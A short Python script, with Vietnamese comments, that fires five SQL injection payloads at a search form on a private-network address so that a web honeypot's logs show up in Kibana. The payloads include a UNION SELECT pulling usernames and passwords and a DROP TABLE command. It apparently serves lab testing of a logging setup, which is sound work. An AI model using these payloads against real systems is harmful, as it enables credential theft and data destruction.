import requests
import time

print("==================================================")
print("🔥 WEB INJECTION SIMULATOR (SQLi on Search Form) 🔥")
print("==================================================\n")

# Thay URL bằng đường dẫn trang tìm kiếm của bạn
SEARCH_URL = "http://192.168.x.x:5000/search"

# Các payload SQLi kinh điển nhắm vào cơ sở dữ liệu
sqli_payloads = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT username, password FROM users--",
    "1; DROP TABLE transactions--",
    "' OR EXISTS(SELECT * FROM dual)--"
]

print(f"[*] Mục tiêu: {SEARCH_URL}")
print("[*] Đang bơm các payload SQL Injection vào tham số tìm kiếm...\n")

for payload in sqli_payloads:
    # Giả lập tham số query 'q' trên form search
    params = {'q': payload}
    try:
        print(f"  [>] Injecting payload: {payload}")
        response = requests.get(SEARCH_URL, params=params, timeout=3)
        
        # Tạo độ trễ để Filebeat kịp đẩy log về ELK
        time.sleep(1) 
    except requests.exceptions.RequestException as e:
        print(f"  [X] Không thể kết nối: {e}")
        break

print("\n[V] Đã hoàn thành đợt tấn công Injection!")
print("[👉] Hãy kiểm tra log Web Honeypot trên Kibana, bạn sẽ thấy các payload này bị ghi lại rõ ràng.")